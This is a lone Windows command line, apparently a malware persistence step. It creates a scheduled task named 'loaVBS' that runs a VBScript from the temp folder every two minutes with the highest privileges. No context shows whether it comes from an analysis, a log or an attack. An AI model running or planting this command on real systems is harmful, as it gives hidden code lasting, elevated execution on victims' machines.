schtasks /create /tn "loaVBS" /tr "%temp%\e.vbs" /sc minute /mo 2 /f /rl HIGHEST
